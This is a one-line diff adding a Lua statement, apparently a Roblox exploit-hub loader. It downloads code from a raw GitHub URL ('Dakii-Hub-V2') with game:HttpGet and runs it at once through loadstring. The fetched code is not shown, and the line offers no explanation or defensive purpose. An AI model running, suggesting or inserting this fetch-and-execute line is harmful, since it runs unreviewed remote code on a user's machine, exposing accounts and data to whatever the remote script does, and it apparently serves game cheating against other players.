@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Rahbin-hw/Dakii-Hub-V2/main/Main"))();
